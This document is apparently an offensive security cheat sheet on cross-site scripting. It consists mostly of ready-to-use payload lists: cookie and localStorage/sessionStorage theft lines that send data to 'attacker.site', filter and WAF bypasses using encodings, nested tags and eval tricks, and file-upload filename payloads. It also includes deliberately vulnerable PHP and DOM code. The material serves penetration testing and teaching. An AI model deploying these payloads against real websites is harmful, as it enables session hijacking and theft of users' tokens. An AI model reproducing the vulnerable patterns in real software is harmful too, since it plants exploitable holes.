---
description: Cross Site Scripting
---

# XSS

> Cross-site Scripting (XSS) is a client-side code injection attack. The attacker aims to execute malicious scripts in a web browser of the victim by including malicious code in a legitimate web page or web application.

```php
#Simple example of a vulnerable code (PHP):
<?php 
  $name = @$_GET['name'];
  echo "Welcome $name";
?>
```

### Types of XSS

* **Reflected:** The payload is included in the URL itself or in a POST parameter. It only affects people accessing the malicious link. Example: Search bars.
* **Stored:** Persistent XSS stored in a database. Every user who access the vulnerable page will receive the payload.
* **DOM Based:** Where content of an input is used to change something in the page (injecting in a client side script).

### Identifying XSS

To identify an XSS vulnerability, we send special characters to a web application in order to test how the application threats those characters. For example, the following characters in a comment section:

```javascript
< > ; ""
```

If we inspect the results in the browser developer console and we see that these characters are not encoded, it's likely that the page is vulnerable to XSS. Confirm full injection with a PoC:

```javascript
"><img src onerror=alert(1)> 
"autofocus onfocus=alert(1)// 
</script><script>alert(1)</script> 
'-alert(1)-' 
\'-alert(1)// 
Javascript:alert(1) 
```

### DOM XSS

A form of XSS that exists only withing client-side code (typically JavaScript). This vulnerability lives within the DOM environment. It is similar to the reflected XSS but without interacting with the server-side. The following example is vulnerable to DOM based XSS:

```javascript
<h2 id='message'></2> 
<script>
  var w = "Welcome ";
  var name = document.location.hash.substr(document.location.hash.search(/#w!/i)+3,document.location.hash.length);
  document.getElementById('message').innerHTML = w + name;
</script>
```

### Stealing Cookies

If HttpOnly cookie flag is not set (it denies JavaScript from accessing cookies), we can modify the payload to hijack user cookies.

```javascript
";new Image().src = "http://attacker.site/c.php?cc="+escape(document.cookie);//
x" onmouseover="new Image().src = 'http://attacker.site/c.php?cc='+escape(document.cookie);
x" onclick="new Image().src = 'http://attacker.site/c.php?cc='+escape(document.cookie);
";new Audio().src = "http://attacker.site/c.php?cc="+escape(document.cookie);//
<video src=x onerror="new Audio().src = 'http://attacker.site/c.php?cc='+escape(document.cookie);">
```

***

### Stealing SessionStorage or LocalStorage

Sometimes JWT tokens or other sensitive information is stored inside HTML5 SessionStorage/LocalStorage. These does not implement security mechanisms like "httpOnly", so we can extract its content easily:

```javascript
<img src='http://attacker.site/data?d='+JSON.stringify(localStorage);'--!>
<img src='http://attacker.site/data?d='+JSON.stringify(sessionStorage);'--!>
```

### XSS on file uploads

If you find a file upload function for an image, try introducing an image with XSS in the filename like:

```bash
#https://twitter.com/Steiner254/status/1564118488175755267
<img src=x onerror=alert('XSS')>.png 
"><img src=x onerror=alert('XSS')>.png 
">.svg <alert('xss')a.png
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
```

### Bypassing blacklist filters

#### Bypass tags blacklist :

```javascript
<ScRiPt>alert(1)</ScRiPt> //Upper & lower case characters
<ScRiPt>alert(1); //Not closing tag
<script/random>alert(1);</script> //Random string after tag
<script{NL}>alert(1);</script> //Newline
<scr<script>ipt>alert(1)</scr<script>ipt> //Nested tags
<scr\x00ipt>alert(1)</scr\x00ipt> //NULL byte (IE < v9)
```

#### Bypass events blacklist:

```javascript
<svg/onload=alert(1)>
<svg//////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x` onload=alert(1)>
<svg onload%09=alert(1)>
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2C%3B=alert(1)>
<svg onload%0B=alert(1)> //IE only
```

#### Bypass keyword blacklist:

```javascript
//Unicode encoding
<script>\u0061lert(1)></script>
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>

//Unicode encoding and using native functions
<script>eval("\u0061lert(1)")</script>
<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>

//Different encodings
<img src=x onerror="\u0061lert(1)"/> //Unicode
<img src=x onerror="eval('\141lert(1)')"/> //Octal scope
<img src=x onerror="eval('\x61lert(1)')"/> //Hexadecimal
<img src=x onerror="&#x0061;lert(1)"/> //Hexadecimal Numeric Character Reference
<img src=x onerror="&#97;lert(1)"/> //Decinal NCR
<img src=x onerror="eval('\a\l\ert\(1\)')"/> //Superflous escapes characters

//Combining all together
<img src=x onerror="\u0065val('\141\u006c&#101;&#x0072t\(&#49)')"/>

//Construct strings using JS functions
/ale/.source+/rt/.source
String.fromCharCode(97,108,101,114,116) 
atob("YEA=") //Base64
17795081..toString(36) //Base64

//Construct strings using JS functions. Try without double quotes too.
setTimeout("alert(1)") //All browsers
setInterval("alert(1)") //All browsers
setImmediate("alert(1)") //IE 10+
Function("alert(1)") //All browsers
[].constructor.constructor(alert(1))

//Pseudo-protocols
<object data="JaVaScRiPt:alert(1)">
<object data="javascript&colon;alert(1)">
<object data="java //NewLine
script:alert(1)> 
<object data="javascript&#003A;alert(1)">
<object data="javascript&#58;alert(1)">                                        
<object data="&#x6A;avascript:alert(1)">
<object data="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">
<object data="data:text/html;base64,<BASE64ENCODED>">   
<object data="DaTa:text/html,<script>alert(1)</script>">  
<object data="data&colon;text/html,<script>alert(1)</script>">
<object data="data&#x003A;text/html,<script>alert(1)</script>">
<object data="&#x64;&#x61;ta:text/html,<script>alert(1)</script>">
```

### Bypassing sanitization filters

#### Bypass when tags are removed:

```javascript
<scr<script>ipt>alert(1)</script>
<scr<iframe>ipt>alert(1)</script>
</</script>script><</svg>svg/onload=alert`xss`>//
```

#### Bypass when quotes are escaped:

```javascript
\' alert(1);//  //"\" is being escaped but not the quote
String.fromCharCode(120,115,9416)
/your string/.source
base32..toString(36)
unescape(/%78%u0073%73/.source)
decodeURI(/alert(%22xss%22)/.source)
decodeURIComponent(/alert(%22xss%22)/.source)
```

**Note:** These methods are useful if we can inject in a script o event handler. We need an execution sink line "eval" to achieve execution.

#### Bypass when parenthesis are escaped:

```javascript
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
<img src=x onerror="windows.onerror=eval;throw'\u003d&#x0061;&#x006C;ert&#x0028;1&#41;'"/>
```

### Other WAF bypasses

```
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
<svg onx=() onload=(confirm)(1)>
<a+HREF=‘javascrip%26%239t:alert%26lpar;document.domain)’>test</a>
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
<—`<img/src=` onerror=confirm``> —!>
Javascript:{alert`0`}
<svg onload=prompt%26%230000000040document.domain)>
';window/*aabb*/['al'%2b'ert'](document./*aabb*/location);//
</</script>script><</svg>svg/onload=alert`xss`>//
```
